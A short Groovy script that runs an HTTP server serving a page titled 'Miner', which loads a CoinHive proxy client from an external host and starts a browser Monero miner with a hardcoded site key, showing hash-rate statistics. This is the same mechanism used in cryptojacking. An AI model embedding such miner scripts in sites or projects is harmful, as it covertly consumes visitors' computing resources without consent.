@Grab('com.github.nao20010128nao:HttpServerJava:3962b51')
@GrabResolver(name='jitpack',root='https://jitpack.io')
import net.freeutils.httpserver.HTTPServer

def server=new HTTPServer(80)

server.getVirtualHost(null).with {
  addContext('/'){req,resp->
    println 'Requested'
    resp.sendHeaders(200)
    resp.body.write '''
<!doctype html>
<html>
<head>
<title>Miner</title>
<script>
var parser = document.createElement('a');
parser.href = location.href

var scptTag=document.createElement('script');
scptTag.setAttribute('src',
    'https://cazala.github.io/coin-hive-proxy/client.js?coin-hive-proxy='+parser.hostname);
document.head.appendChild(scptTag);
</script>

<script>
var miner = new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66');
miner.start(CoinHive.FORCE_MULTI_TAB);
</script>
</head>
<body>
<p>H/s: <div id="hps"></div></p>
<p>Total: <div id="tot"></div></p>
<p>accepted: <div id="acc"></div></p>
<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
		document.getElementById('hps').innerHTML=hashesPerSecond;
		document.getElementById('tot').innerHTML=totalHashes;
		document.getElementById('acc').innerHTML=acceptedHashes;
	}, 1000);
</script>
</body>
</html>
'''.trim().bytes
    0
  }
}

server.start()

println 'Ready'
